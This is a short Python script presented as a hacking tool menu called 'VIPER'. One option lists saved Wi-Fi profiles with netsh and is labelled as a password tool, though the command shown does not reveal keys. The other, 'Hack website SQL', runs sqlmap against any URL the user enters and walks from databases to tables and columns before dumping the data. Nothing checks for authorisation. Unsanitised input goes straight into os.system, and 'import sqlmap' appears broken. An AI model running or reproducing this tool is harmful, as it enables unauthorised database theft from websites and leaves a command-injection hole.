import os
import sqlmap
runthis = True
print("------------------------------------")
print("██╗   ██╗██╗██████╗ ███████╗██████╗")
print("██║   ██║██║██╔══██╗██╔════╝██╔══██╗")
print("██║   ██║██║██████╔╝█████╗  ██████╔╝")
print("╚██╗ ██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗")
print(" ╚████╔╝ ██║██║     ███████╗██║  ██║")
print("  ╚═══╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝")
print("------------------------------------")
print("")
def passwifilogin():
    os.system("netsh wlan show profile")
    print("e = Exit")
    usr1 = input("Select profile name -----> ")
    if usr1 == "e":
        print("\nExit Tool\n\n")
        return
    os.system("netsh wlan show profile {}".format(usr1))
    print("-----------------------------------------\n\n")
def hackweb_1():
    usrurl = input("Enter url website -----> ")
    os.system("sqlmap -u {} --dbs".format(usrurl))

    usrD = input("Enter database name -----> ")
    os.system("sqlmap -u {} -D {} --tables".format(usrurl,usrD))

    usrT = input("Enter database table name -----> ")
    os.system("sqlmap -u {} -D {} -T {} --columns".format(usrurl,usrD,usrT))

    usrC = input("Enter columns name -----> ")
    os.system("sqlmap -u {} -D {} -T {} -C {} --dump".format(usrurl, usrD, usrT,usrC))

while runthis:
    #print number tool
    print("x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x")
    print("e = Exit | ")
    print("Enter Selected Tool")
    print("[1] Password wifi login")
    print("[2] Hack website SQL")
    usrinput = input()
    if usrinput == "e":
        runthis = False
    elif usrinput == "1":
        passwifilogin()
    elif usrinput == "2":
        hackweb_1()


